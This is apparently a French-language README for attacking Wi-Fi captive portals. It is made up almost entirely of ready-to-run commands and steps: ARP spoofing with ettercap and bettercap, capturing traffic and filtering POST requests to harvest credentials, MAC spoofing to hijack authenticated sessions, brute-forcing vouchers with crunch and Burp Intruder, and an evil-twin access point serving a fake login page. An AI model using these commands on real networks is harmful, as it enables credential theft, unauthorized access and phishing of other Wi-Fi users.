# Captive-Portal-Hack
Captive portal hacking

**-->Arp Spoofing / MiTm**  

Outils: ettercap, bettercap, air... suite, wireshark ...  

Commandes utiles et steps:  

**Ettercap**  
-$sudo ettercap -Tq -M arp:remote -i wlan0 ///  

**airmon-ng, airodump-ng, wireshark**  
-$sudo airmon-ng check kill  
-$sudo airmon-ng start wlan0  
-$sudo airodump-ng wlan0  
-$sudo airodump-ng --bssid <BSSID> -c <CH> -w nomFichierCapture wlan0  
Ensuite ouvrir le fichier de capture .cap dans wireshark et filtrer les traffics post (http.request.method==POST).  

**Bettercap**
-$sudo bettercap -iface wlan0 
  Dans la console bettercap:
    >net.probe on
    >net.recon on
    >arp.spoof on 
    >net.sniff on

**-->Mac Spoofing**
Outils: aircrack-ng suite, ip ...

Commandes utiles:

**aircrack suite, ifconfig, macchanger**
-$sudo airmon-ng start wlan0
-$sudo airodump-ng wlan0mon 
-$sudo ifconfig wlan0 down
-$sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0
-$sudo iwconfig wlan0 mode managed
-$sudo ifconfig wlan0 up
-$sudo systemctl restart NetworkManager


**--> Bruteforce des identifiants**
Outils : crunch, burpsuite

Quelques prérequis:
Observer le format des mots de passe/vouchers (longueur, caractères) pour créer un dictionnaire ciblé.
Le MAC spoofing peut servir à identifier un nom d’utilisateur via la page /status.

-$crunch <minLength> <maxLength> <charset> > dictionnaire.txt

**Steps**
- Ouvrir Burp Suite et aller dans l’onglet Proxy.
- Configurer le navigateur pour passer par le proxy de Burp ou utiliser le navigateur intégré.
- Charger la page de login et soumettre des identifiants incorrects.
- Intercepter la requête et l’envoyer à Intruder.
- Sélectionner les champs à brute-forcer.
- Choisir Battering Ram (username = password) ou Cluster Bomb (username ≠ password).
- Charger le dictionnaire.
- Dans Resource Pool, définir delay between requests = 1000 ms et max concurrent requests = 1.
- Lancer l’attaque et observer une réponse de longueur très différente (ça aura un code 302 redirect ou un 404 not found)


**--> Faux points d'accès**
Outils: fluxion, airbase-ng
Commandes utiles:
-$sudo airmon-ng start wlan0
-$sudo airbase-ng -e "EvilTwinName" -c 6 wlan0

Servir une fausse page de connexion et rediriger tout le traffic http vers elle



